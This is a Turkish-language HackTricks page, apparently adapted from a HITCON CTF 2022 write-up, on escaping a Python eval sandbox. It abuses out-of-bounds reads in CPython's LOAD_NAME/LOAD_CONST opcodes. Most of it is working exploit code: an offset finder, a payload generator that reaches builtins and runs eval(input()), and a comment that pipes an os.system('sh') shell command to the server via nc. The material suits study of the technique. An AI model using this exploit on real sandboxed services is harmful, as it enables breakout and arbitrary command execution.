# LOAD\_NAME / LOAD\_CONST opcode OOB Okuma

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

**Bu bilgi** [**bu yazıdan alındı**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD\_NAME / LOAD\_CONST opcode'da OOB okuma özelliğini kullanarak bellekteki bazı sembolleri alabiliriz. Bu, istediğiniz bir sembolü (örneğin, fonksiyon adı) almak için `(a, b, c, ... yüzlerce sembol ..., __getattribute__) if [] else [].__getattribute__(...)` gibi bir hile kullanmak anlamına gelir.

Sonra sadece istismarınızı oluşturun.

### Genel Bakış <a href="#overview-1" id="overview-1"></a>

Kaynak kod oldukça kısa, sadece 4 satır içeriyor!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Arbitrary Python kodu girebilirsiniz ve bu, bir [Python kod nesnesi](https://docs.python.org/3/c-api/code.html) olarak derlenecektir. Ancak, bu kod nesnesinin `co_consts` ve `co_names` boş bir demet ile eval edilmeden önce değiştirilecektir.

Bu şekilde, tüm ifadeler sabitler (örneğin, sayılar, dizeler vb.) veya isimler (örneğin, değişkenler, fonksiyonlar) içeriyorsa, sonunda segmentasyon hatasına neden olabilir.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segfault nasıl meydana gelir?

Basit bir örnekle başlayalım, `[a, b, c]` aşağıdaki bytecode'a derlenebilir.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ama `co_names` boş bir demet haline gelirse ne olur? `LOAD_NAME 2` opcode'u hala çalıştırılır ve o bellek adresinden değer okumaya çalışır. Evet, bu bir out-of-bound read "özelliği".

Çözümün temel konsepti basittir. CPython'daki bazı opcode'lar, örneğin `LOAD_NAME` ve `LOAD_CONST`, OOB read'e karşı savunmasızdır (?).

Bir nesneyi `consts` veya `names` demetinden `oparg` indeksinden alırlar (arka planda buna `co_consts` ve `co_names` denir). CPython'un `LOAD_CONST` opcode'unu işlerken ne yaptığını görmek için `LOAD_CONST` hakkında aşağıdaki kısa kesiti inceleyebiliriz.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Bu şekilde OOB özelliğini kullanarak rastgele bellek ofsetinden bir "isim" alabiliriz. Hangi isme sahip olduğunu ve ofsetinin ne olduğunu öğrenmek için, `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... denemeye devam edin. Yaklaşık oparg > 700'de bir şey bulabilirsiniz. Elbette gdb kullanarak bellek düzenine de bakmayı deneyebilirsiniz, ama bunun daha kolay olacağını düşünmüyorum?

### Exploit Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Bu yararlı ofsetleri isimler / sabitler için aldıktan sonra, o ofsetten bir isim / sabit nasıl alır ve kullanırız? İşte sizin için bir hile:\
Ofset 5'ten (`LOAD_NAME 5`) bir `__getattribute__` ismi alabileceğimizi varsayalım (`co_names=()`), o zaman sadece aşağıdaki adımları izleyin:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Dikkat edin ki, bunu `__getattribute__` olarak adlandırmak zorunda değilsiniz, daha kısa veya daha garip bir isim verebilirsiniz.

Bunun arkasındaki nedeni sadece bytecode'unu görüntüleyerek anlayabilirsiniz:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`'ın da `co_names`'den ismi aldığını unutmayın. Python, isim aynıysa aynı offset'ten isimleri yükler, bu nedenle ikinci `__getattribute__` hala offset=5'ten yüklenir. Bu özelliği kullanarak, isim bellek yakınındaysa rastgele bir ismi kullanabiliriz.

Sayılar üretmek oldukça basit olmalıdır:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Uzunluk sınırı nedeniyle consts kullanmadım.

İlk olarak, bu isimlerin offset'lerini bulmamız için bir script.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Ve aşağıdaki gerçek Python istismarını oluşturmak içindir.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Temelde şu işlemleri yapar, bu dizeleri `__dir__` yönteminden alırız:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
